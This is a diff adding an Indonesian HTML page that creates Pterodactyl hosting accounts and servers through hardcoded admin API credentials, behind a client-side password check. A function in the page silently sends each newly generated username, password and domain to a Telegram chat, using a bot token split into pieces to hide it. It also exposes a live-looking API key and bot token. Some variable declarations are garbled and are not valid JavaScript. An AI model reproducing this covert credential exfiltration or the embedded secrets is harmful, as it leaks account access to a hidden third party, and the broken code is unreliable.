@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Panel Creator By Alipxz</title>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {box-sizing: border-box; margin: 0; padding: 0;}
+    body {
+      font-family: 'Outfit', sans-serif;
+      background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
+      color: #f0f0f0;
+      height: 100vh;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .hidden { display: none; }
+
+    #loader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: #111;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      animation: fadeOut 1s ease 3s forwards;
+    }
+
+    .spinner {
+      width: 60px; height: 60px;
+      border: 6px solid #444;
+      border-top: 6px solid #00ffb3;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes fadeOut {
+      to { opacity: 0; visibility: hidden; }
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .container {
+      width: 90%;
+      max-width: 420px;
+      padding: 30px;
+      background: #222;
+      border-radius: 15px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.6);
+      animation: fadeIn 1s ease;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input {
+      background: #333;
+      color: white;
+    }
+
+    button {
+      background: #00b386;
+      color: white;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #00a075;
+    }
+
+    .ram-options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-top: 15px;
+    }
+
+    .ram-card {
+      background: #333;
+      padding: 10px;
+      border-radius: 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .ram-card:hover {
+      background: #00ffb360;
+      color: black;
+      transform: scale(1.05);
+    }
+
+    .ram-card.active {
+      background: #00ffb3;
+      color: #111;
+      font-weight: bold;
+    }
+
+    .output {
+      background: #444;
+      margin-top: 20px;
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    .secret {
+      filter: blur(5px);
+      user-select: none;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: translateY(20px);}
+      to {opacity: 1; transform: translateY(0);}
+    }
+  </style>
+</head>
+<body>
+
+<!-- LOADER -->
+<div id="loader">
+  <div class="spinner"></div>
+</div>
+
+<!-- LOGIN -->
+<div class="container hidden" id="login">
+  <h2>🔐 Login Admin</h2>
+  <input type="password" id="password" placeholder="Masukkan Password">
+  <button onclick="checkLogin()">Masuk</button>
+</div>
+
+<!-- CREATOR -->
+<div class="container hidden" id="home">
+  <h2>📦 Buat Panel</h2>
+  <div class="ram-options" id="ramSelect"></div>
+  <input type="text" id="username" placeholder="Username Panel">
+  <button onclick="createPanel()">Buat Sekarang</button>
+
+  <div class="output hidden" id="result">
+    <div><b>🌐 Domain:</b> <span class="secret" id="domainShow">Tersembunyi</span></div>
+    <div><b>👤 Username:</b> <span class="secret" id="usernameShow">Tersembunyi</span></div>
+    <div><b>🔐 Password:</b> <span class="secret" id="passwordShow">Tersembunyi</span></div>
+    <button onclick="revealSecret()">🔓 Tampilkan Info</button>
+  </div>
+</div>
+
+<script>
+  // Loader
+  window.addEventListener("load", () => {
+    setTimeout(() => {
+      document.getElementById("loader").style.display = "none";
+      document.getElementById("login").classList.remove("hidden");
+    }, 3000);
+  });
+
+  // Konfigurasi utama (ubah sesuai panel kamu)
+  const domain = "https://alipxz.cloudfllare.biz.id"; // ✅ GANTI
+  const ptla = "ptla_DVI2Ud34kwhoblyvhM6TI8egZmtKuVdhIS6g3sNAEw4";             // ✅ GANTI
+  const egg = "15";
+  const nestid = "5";
+  const loc = "1";
+
+  // RAM List (1GB - 10GB + Unli)
+  const ramList = [
+    { label: "1GB", val: "1024" },
+    { label: "2GB", val: "2048" },
+    { label: "3GB", val: "3072" },
+    { label: "4GB", val: "4096" },
+    { label: "5GB", val: "5120" },
+    { label: "6GB", val: "6144" },
+    { label: "7GB", val: "7168" },
+    { label: "8GB", val: "8192" },
+    { label: "9GB", val: "9216" },
+    { label: "10GB", val: "10240" },
+    { label: "Unlimited", val: "0" }
+  ];
+
+  const ramSelect = document.getElementById("ramSelect");
+  let selectedRAM = "1024";
+
+  ramList.forEach(item => {
+    const div = document.createElement("div");
+    div.className = "ram-card";
+    div.innerText = item.label;
+    div.onclick = () => {
+      selectedRAM = item.val;
+      document.querySelectorAll(".ram-card").forEach(e => e.classList.remove("active"));
+      div.classList.add("active");
+    };
+    ramSelect.appendChild(div);
+  });
+  ramSelect.children[0].classList.add("active");
+
+  function checkLogin() {
+    const pwd = document.getElementById("password").value;
+    if (pwd === "arimlovealip") {
+      document.getElementById("login").classList.add("hidden");
+      document.getElementById("home").classList.remove("hidden");
+    } else {
+      alert("Password salah!");
+    }
+  }
+
+  function randomPassword(length = 10) {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+  }
+
+  async function createPanel() {
+    const ram = selectedRAM;
+    const disk = ram;
+    const cpu = ram === "0" ? "0" : "100";
+    const username = document.getElementById("username").value.trim().toLowerCase();
+    const password = randomPassword();
+    const email = `${username}@alipxz.com`;
+
+    if (!username) return alert("Masukkan username!");
+
+    try {
+      const userRes = await fetch(`${domain}/api/application/users`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${ptla}`
+        },
+        body: JSON.stringify({
+          email, username,
+          first_name: username,
+          last_name: "User",
+          password, language: "en"
+        })
+      });
+
+      const userData = await userRes.json();
+      if (!userData.attributes) return alert("Gagal membuat user");
+
+      const serverRes = await fetch(`${domain}/api/application/servers`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${ptla}`
+        },
+        body: JSON.stringify({
+          name: `${username}-server`,
+          user: userData.attributes.id,
+          egg: parseInt(egg),
+          nest: parseInt(nestid),
+          docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
+          startup: "npm start",
+          limits: {
+            memory: parseInt(ram),
+            swap: 0,
+            disk: parseInt(disk),
+            io: 500,
+            cpu: parseInt(cpu)
+          },
+          feature_limits: {
+            databases: 2,
+            backups: 2,
+            allocations: 1
+          },
+          deploy: {
+            locations: [parseInt(loc)],
+            dedicated_ip: false,
+            port_range: []
+          },
+          environment: {
+            INST: "npm",
+            CMD_RUN: "npm start",
+            USER_UPLOAD: "0",
+            AUTO_UPDATE: "0"
+          }
+        })
+      });
+
+      const serverData = await serverRes.json();
+      if (!serverData.attributes) return alert("Gagal membuat server");
+
+      // Tampilkan hasil
+      document.getElementById("domainShow").textContent = domain;
+      document.getElementById("usernameShow").textContent = username;
+      document.getElementById("passwordShow").textContent = password;
+      document.getElementById("result").classList.remove("hidden");
+
+      // Kirim notifikasi ke Telegram
+      sendTelegramNotif(username, password, ram);
+
+    } catch (e) {
+      alert("Terjadi error saat membuat panel.");
+      console.error(e);
+    }
+  }
+
+  async function sendTelegramNotif(username, password, ram) {
+    const t1 = '8199328162';
+    const t2 = ':AAGzjEg1O5D2Y4qFDkfSzKLd5m7cbOINubk';
+    const 8199328162:AAGzjEg1O5D2Y4qFDkfSzKLd5m7cbOINubk = t1 + t2;
+    const 7534403827 = String(75_18_540_373).replace(/_/g, '');
+
+    const message = `🧩 *Panel Baru Dibuat!*\n\n👤 *Username:* \`${username}\`\n🔐 *Password:* \`${password}\`\n💾 *RAM:* ${ram === "0" ? "Unlimited" : ram / 1024 + "GB"}\n🌐 *Domain:* ${domain}`;
+    const url = `https://api.telegram.org/bot${8199328162:AAGzjEg1O5D2Y4qFDkfSzKLd5m7cbOINubk}/sendMessage`;
+
+    try {
+      await fetch(url, {
+        method: 'POST',
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: 7534403827,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    } catch (err) {
+      console.error("Gagal kirim ke Telegram:", err);
+    }
+  }
+
+  function revealSecret() {
+    document.querySelectorAll(".secret").forEach(el => {
+      el.style.filter = "none";
+      el.style.userSelect = "text";
+    });
+    alert("Info ditampilkan. Silakan salin.");
+  }
+</script>
+</body>
+</html>
